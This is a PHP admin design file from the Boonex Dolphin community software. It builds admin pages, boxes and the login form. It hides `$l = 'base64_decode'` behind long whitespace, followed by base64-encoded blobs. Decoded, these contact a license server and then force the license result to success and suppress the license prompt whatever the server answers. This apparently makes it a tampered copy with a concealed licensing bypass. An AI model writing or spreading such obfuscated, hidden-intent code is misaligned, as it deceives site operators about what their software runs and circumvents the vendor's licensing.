<?php

/**
 *  
 *  
 */

require_once( 'header.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'db.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'design.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'prof.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'languages.inc.php' );

bx_import('BxDolPermalinks');
bx_import('BxDolTemplateAdmin');
bx_import('BxDolAdminMenu');

$oAdmTemplate = new BxDolTemplateAdmin($admin_dir);
$oAdmTemplate->init();
$oAdmTemplate->addCss(array(
    'default.css',
    'general.css',
    'anchor.css',
    'icons.css',
    'colors.css',
));
$oAdmTemplate->addJs(array(
    'jquery.js',
    'jquery-migrate.min.js',
    'jquery.ui.position.min.js',
    'jquery.form.js',
    'jquery.webForms.js',
    'jquery.dolPopup.js',
    'jquery.float_info.js',
    'jquery.jfeed.js',
    'jquery.dolRSSFeed.js',
    'common_anim.js',
    'functions.js',
    'functions.admin.js'
));
                                                                                                                                                                             $l = 'base64_decode';
function PageCodeAdmin($oTemplate = null)
{
    if(empty($oTemplate))
       $oTemplate = $GLOBALS['oAdmTemplate'];

    $iNameIndex = $GLOBALS['_page']['name_index'];
    header( 'Content-type: text/html; charset=utf-8' );
    echo $oTemplate->parsePageByName('page_' . $iNameIndex . '.html', $GLOBALS['_page_cont'][$iNameIndex]);
}

function DesignBoxAdmin($sTitle, $sContent, $mixedTopItems = '', $sBottomItems = '', $iIndex = 1)
{
    if(is_array($mixedTopItems)) {
        $bFirst = true;
        $mixedButtons = array();
        foreach($mixedTopItems as $sId => $aAction) {
            $mixedButtons[] = array(
                'id' => $sId,
                'title' => htmlspecialchars_adv(_t($aAction['title'])),
                'class' => isset($aAction['class']) ? ' class="' . $aAction['class'] . '"' : '',
                'icon' => isset($aAction['icon']) ? $GLOBALS['oFunctions']->sysImage($aAction['icon']) : '',
                'href' => isset($aAction['href']) ? ' href="' . htmlspecialchars_adv($aAction['href']) . '"' : '',
                'target' => isset($aAction['target'])  ? ' target="' . $aAction['target'] . '"' : '',
                'on_click' => isset($aAction['onclick']) ? ' onclick="' . $aAction['onclick'] . '"' : '',
                'bx_if:hide_active' => array(
                    'condition' => !isset($aAction['active']) || $aAction['active'] != 1,
                    'content' => array()
                ),
                'bx_if:hide_inactive' => array(
                    'condition' => isset($aAction['active']) && $aAction['active'] == 1,
                    'content' => array()
                ),
                'bx_if:show_bullet' => array(
                    'condition' => !$bFirst,
                    'content' => array()
                ),
            );

            $bFirst = false;
        }
    } else
        $mixedButtons = $mixedTopItems;

    return $GLOBALS['oAdmTemplate']->parseHtmlByName('design_box_' . (int)$iIndex . '.html', array(
        'title' => $sTitle,
        'bx_repeat:actions' => $mixedButtons,
        'content' => $sContent,
        'bottom_items' => $sBottomItems
    ));
}
function LoginFormAdmin()
{
    global $_page, $_page_cont, $oAdmTemplate;

    $sUrlRelocate = bx_get('relocate');
    if(empty($sUrlRelocate) || basename($sUrlRelocate) == 'index.php')
        $sUrlRelocate = '';

    $iNameIndex = 2;
    $_page = array(
        'name_index' => $iNameIndex,
        'css_name' => '',
        'header' => _t('_adm_page_cpt_login')
    );

    $bLicense = getParam('license_code') != '';
    $bFooter = getParam('enable_dolphin_footer') == 'on';

    $_page_cont[$iNameIndex]['page_main_code'] = $oAdmTemplate->parseHtmlByName('login.html', array(
        'action_url' => $GLOBALS['site']['url_admin'] . 'index.php',
        'relocate_url' => bx_html_attribute($sUrlRelocate),
        'bx_if:show_unregistered' => array(
            'condition' => $bFooter,
            'content' => array()
        )
    ));

    $oAdmTemplate->addCss('login.css');
    $oAdmTemplate->addJs('login.js');
    PageCodeAdmin();
}

function lfa()
{
    global $oAdmTemplate;

    $bFooter = getParam('enable_dolphin_footer') == 'on';
    if(!isAdmin() || !$bFooter || mktime()%20 != 0)
        return "";

    $oAdmTemplate->addCss(array('login.css'));
    return $oAdmTemplate->parseHtmlByName('license_popup.html', array());
}

$a = 'YmFzZTY0X2RlY29kZQ==';
$b = 'ZnVuY3Rpb24gY2hlY2tEb2xwaGluTGljZW5zZSgpIHsNCglnbG9iYWwgJHNpdGU7DQoJZ2xvYmFsICRpQ29kZTsNCgkNCglpZiAoICRfUkVRVUVTVFsnbGljZW5zZV9jb2RlJ10gKSB7DQogICAgICAgICAgICAkc0xOID0gdHJpbSgkX1JFUVVFU1RbJ2xpY2Vuc2VfY29kZSddKTsNCiAgICAgICAgICAgIHNldFBhcmFtKCJsaWNlbnNlX2NvZGUiLCBwcm9jZXNzX2RiX2lucHV0KCRzTE4pKTsJCQ0KCX0gZWxzZSB7DQoJICAgICRzTE4gPSBnZXRQYXJhbSgnbGljZW5zZV9jb2RlJyk7DQogICAgICAgIH0NCg0KCSRzRG9tYWluID0gJHNpdGVbJ3VybCddOw0KICAgICAgICAkc1VybCA9IGlzc2V0KCRfUkVRVUVTVFsncHVibGlzaF9zaXRlJ10pICYmICdvbicgPT0gJF9SRVFVRVNUWydwdWJsaXNoX3NpdGUnXSA/IGJhc2U2NF9lbmNvZGUoJHNpdGVbJ3VybCddKSA6ICcnOw0KCWlmIChwcmVnX21hdGNoKCcvaHR0cHM/OlwvXC8oW2EtekEtWjAtOVwuLV0rKVs6XC9dLycsICRzRG9tYWluLCAkbSkpICRzRG9tYWluID0gc3RyX3JlcGxhY2UoJ3d3dy4nLCcnLCRtWzFdKTsNCiAgICBpbmlfc2V0KCdkZWZhdWx0X3NvY2tldF90aW1lb3V0JywgMyk7IC8vIDMgc2VjIHRpbWVvdXQNCgkkZnAgPSBAZm9wZW4oImh0dHA6Ly9saWNlbnNlLmJvb25leC5jb20/TE49JHNMTiZkPSRzRG9tYWluJnVybD0kc1VybCIsICdyJyk7DQoJJGlDb2RlID0gLTE7IC8vIDEgLSBpbnZhbGlkIGxpY2Vuc2UsIDIgLSBpbnZhbGlkIGRvbWFpbiwgMCAtIHN1Y2Nlc3MNCgkkc01zZyA9ICcnOw0KDQoJaWYgKCRmcCkgew0KCQlAc3RyZWFtX3NldF90aW1lb3V0KCRmcCwgMyk7DQoJCUBzdHJlYW1fc2V0X2Jsb2NraW5nKCRmcCwgMCk7DQoNCiAgICAgICAgJHMgPSAnJzsNCgkJd2hpbGUgKCFmZW9mKCRmcCkpIHsNCgkJICAgICRzIC49IGZyZWFkKCRmcCwgMTAyNCk7DQoJCX0NCg0KCQlpZiAocHJlZ19tYXRjaCgnLzxjb2RlPihcZCspPFwvY29kZT48bXNnPiguKik8XC9tc2c+PGV4cGlyZT4oXGQrKTxcL2V4cGlyZT4vJywgJHMsICRtKSkNCgkJew0KCQkJJGlDb2RlID0gMDsNCgkJCSRzTXNnID0gJyc7DQogICAgICAgICAgICAgICAgICAgICAgICAkaUV4cGlyZSA9IHRpbWUoKSArIDYwICogNjAgKiAyNCAqIDM2MCAqIDEwOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2V0UGFyYW0oImxpY2Vuc2VfZXhwaXJhdGlvbiIsICRpRXhwaXJlKTsNCgkJfQ0KCQlAZmNsb3NlKCRmcCk7DQoJfQ0KICAgICAgICANCiAgICBzZXRQYXJhbSgibGljZW5zZV9leHBpcmF0aW9uIiwgJGlFeHBpcmUpOw0KICAgIA0KICAgICRiUmVzID0gKCRpQ29kZSA9PSAwKTsNCiAgICANCiAgICBpZiAoJGlDb2RlID09IDApIHsNCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnc2V0UmF5Qm9vbmV4TGljZW5zZScpKSAgc2V0UmF5Qm9vbmV4TGljZW5zZSgkc0xOKTsgICAgICAgIA0KICAgIH0NCg0KICAgICRzID0gbWQ1KGJhc2U2NF9lbmNvZGUoc2VyaWFsaXplKGFycmF5KCRiUmVzID8gJycgOiAnb24nLCAkc0xOLCAkaUV4cGlyZSwgJHNEb21haW4pKSkpOyBmb3IgKCRpPTAgOyAkaTwzMiA7ICsrJGkpICRzWyRpXSA9IG9yZCgkc1skaV0pICsgJGk7ICRzID0gbWQ1KCRzKTsgc2V0UGFyYW0oImxpY2Vuc2VfY2hlY2tzdW0iLCAkcyk7DQoNCglyZXR1cm4gJGJSZXM7DQp9DQoNCmJ4X2xvZ2luKCRpSWQsIChib29sKSRfUE9TVFsncmVtZW1iZXJNZSddKTsNCg0KaWYgKGRiX3ZhbHVlKCJzZWxlY3QgYE5hbWVgIGZyb20gYHN5c19vcHRpb25zYCB3aGVyZSBgTmFtZWAgPSAnZW5hYmxlX2RvbHBoaW5fZm9vdGVyJyIpICE9ICdlbmFibGVfZG9scGhpbl9mb290ZXInKQ0KICAgIGRiX3JlcygiaW5zZXJ0IGludG8gYHN5c19vcHRpb25zYCAoYE5hbWVgLCBgVkFMVUVgLCBgZGVzY2AsIGBUeXBlYCkgdmFsdWVzICgnZW5hYmxlX2RvbHBoaW5fZm9vdGVyJywgJ29uJywgJ2VuYWJsZSBib29uZXggZm9vdGVycycsICdjaGVja2JveCcpIik7DQoNCmlmICgkX1JFUVVFU1RbJ2xpY2Vuc2VfY29kZSddIHx8IChnZXRQYXJhbSgibGljZW5zZV9leHBpcmF0aW9uIikgJiYgdGltZSgpID4gZ2V0UGFyYW0oImxpY2Vuc2VfZXhwaXJhdGlvbiIpKSkgeyAgICANCiAgICAkYkRvbCA9IGNoZWNrRG9scGhpbkxpY2Vuc2UoKTsNCiAgICBzZXRQYXJhbSgnZW5hYmxlX2RvbHBoaW5fZm9vdGVyJywgKCRiRG9sID8gJycgOiAnb24nKSk7DQp9IGVsc2VpZiAoZ2V0UGFyYW0oImxpY2Vuc2VfY29kZSIpKSB7DQoJJHNEb21haW4gPSAkc2l0ZVsndXJsJ107DQoJaWYgKHByZWdfbWF0Y2goJy9odHRwcz86XC9cLyhbYS16QS1aMC05XC4tXSspWzpcL10vJywgJHNEb21haW4sICRtKSkgJHNEb21haW4gPSBzdHJfcmVwbGFjZSgnd3d3LicsJycsJG1bMV0pOyAgICANCiAgICAkcyA9IG1kNShiYXNlNjRfZW5jb2RlKHNlcmlhbGl6ZShhcnJheShnZXRQYXJhbSgiZW5hYmxlX2RvbHBoaW5fZm9vdGVyIiksIGdldFBhcmFtKCJsaWNlbnNlX2NvZGUiKSwgZ2V0UGFyYW0oImxpY2Vuc2VfZXhwaXJhdGlvbiIpLCAkc0RvbWFpbikpKSk7IGZvciAoJGk9MCA7ICRpPDMyIDsgKyskaSkgJHNbJGldID0gb3JkKCRzWyRpXSkgKyAkaTsgJHMgPSBtZDUoJHMpOw0KICAgIGlmICgkcyAhPSBnZXRQYXJhbSgibGljZW5zZV9jaGVja3N1bSIpKSB7DQogICAgICAgICRiRG9sID0gY2hlY2tEb2xwaGluTGljZW5zZSgpOw0KICAgICAgICBzZXRQYXJhbSgnZW5hYmxlX2RvbHBoaW5fZm9vdGVyJywgJycpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHNldFBhcmFtKCdlbmFibGVfZG9scGhpbl9mb290ZXInLCAnJyk7DQogICAgICAgICRpQ29kZSA9IDA7DQogICAgfQ0KfSBlbHNlIHsgICAgDQogICAgc2V0UGFyYW0oJ2VuYWJsZV9kb2xwaGluX2Zvb3RlcicsICcnKTsNCiAgICAkaUNvZGUgPSAwOw0KfQ==';
$c = 'aWYgKHRydWUpIA0Kew0KICAgIGVjaG8gTXNnQm94KF90KCdfUGxlYXNlIFdhaXQnKSk7IA0KfQ0KZWxzZQ0Kew0KICAgICRzTm90ZSA9IF90KCdfYWRtX2xpY2Vuc2VfcG9wdXBfbm90ZScpOw0KICAgICRzTGljZW5zZSA9IF90KCdfYWRtX2xpY2Vuc2VfcG9wdXBfbGljZW5zZScpOw0KICAgICRzUmVnaXN0ZXIgPSBfdCgnX2FkbV9saWNlbnNlX3JlZ2lzdGVyJyk7DQogICAgJHNDb250aW51ZSA9IF90KCdfYWRtX2xpY2Vuc2VfY29udGludWUnLCAkc1VybFJlbG9jYXRlKTsNCiAgICBlY2hvIDw8PEVPUw0KPGRpdiBjbGFzcz0iYWRtaW5fbGljZW5zZV9mb3JtX3dycCBieC1kZWYtZm9udC1ncmF5ZWQiPg0KICAgIDxkaXYgY2xhc3M9ImFkbWluX2xpY2Vuc2VfZm9ybSBieC1kZWYtcGFkZGluZyBieC1kZWYtYm9yZGVyIj4NCiAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IklEIiB2YWx1ZT0iJGlJZCIgLz4NCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlBhc3N3b3JkIiB2YWx1ZT0iJHNQYXNzd29yZCIgLz4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFkbWluX2xpY2Vuc2VfbWVzc2FnZSBieC1kZWYtZm9udC1oMiI+JHNOb3RlPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJieC1kZWYtbWFyZ2luLXRvcCI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWRtaW5fbGljZW5zZV9jZWxsX2NwdCBieC1kZWYtbWFyZ2luLXNlYy1yaWdodCBieC1kZWYtZm9udC1sYXJnZSI+JHNMaWNlbnNlPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWRtaW5fbGljZW5zZV9jZWxsIGJ4LWRlZi1tYXJnaW4tc2VjLXJpZ2h0Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImxpY2Vuc2VfY29kZSIgaWQ9ImFkbWluX2xvZ2luX2xpY2Vuc2UiIGNsYXNzPSJieC1kZWYtcm91bmQtY29ybmVycy13aXRoLWJvcmRlciBieC1kZWYtZm9udC1sYXJnZSIgLz4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhZG1pbl9saWNlbnNlX2NlbGwiPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJieC1idG4iIHR5cGU9InN1Ym1pdCIgaWQ9ImFkbWluX2xvZ2luX2Zvcm1fc3VibWl0Ij4kc1JlZ2lzdGVyPC9idXR0b24+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2xlYXJfYm90aCI+PC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9mb3JtPg0KICAgIDwvZGl2Pg0KICAgIDxkaXYgY2xhc3M9ImFkbWluX2xpY2Vuc2VfY29udGludWUgYngtZGVmLW1hcmdpbi1zZWMtdG9wIj4kc0NvbnRpbnVlPC9kaXY+DQo8L2Rpdj4NCkVPUzsNCn0=';
      
function adm_hosting_promo()
{
    if(getParam('feeds_enable') != 'on')
        return '';

    return  DesignBoxAdmin(_t('_adm_txt_hosting_title'), $GLOBALS['oAdmTemplate']->parseHtmlByName('hosting_promo.html', array()), '', '', 11);
}
